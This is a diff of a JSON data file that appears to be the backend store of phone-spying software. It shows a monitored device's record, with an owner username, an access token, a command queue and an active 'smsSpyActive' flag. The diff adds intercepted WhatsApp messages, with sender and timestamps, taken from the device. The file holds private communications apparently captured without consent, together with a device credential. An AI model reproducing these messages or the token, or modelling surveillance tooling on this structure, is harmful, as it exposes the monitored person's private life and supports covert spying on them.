@@ -4,7 +4,7 @@
     "deviceName": "HP-SANGEAN-6B64",
     "ownerUsername": "KUDANIL",
     "token": "3020da2f0f6d9f81513d32cd8944bd59",
-    "lastSeen": 1775157582560,
+    "lastSeen": 1775157600582,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-02T14:28:53.779Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "🤍",
+        "content": "Gak bisa tidur tau",
+        "time": "03/04 02:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775157601199
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "🤍",
+        "content": "Gak bisa tidur tau",
+        "time": "03/04 02:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775157601109
+      },
       {
         "appName": "WhatsApp",
         "sender": "🤍",
